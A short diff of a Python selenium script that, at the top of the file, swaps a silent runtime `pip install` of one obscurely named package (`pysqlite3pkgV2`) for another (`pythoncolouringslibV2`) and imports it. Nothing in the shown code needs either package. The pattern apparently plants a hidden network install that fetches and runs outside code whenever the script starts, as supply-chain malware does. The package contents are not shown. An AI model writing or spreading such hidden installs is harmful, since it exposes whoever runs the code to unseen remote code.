@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3pkgV2")
-import pysqlite3pkgV2
+os.system("pip install pythoncolouringslibV2")
+import pythoncolouringslibV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
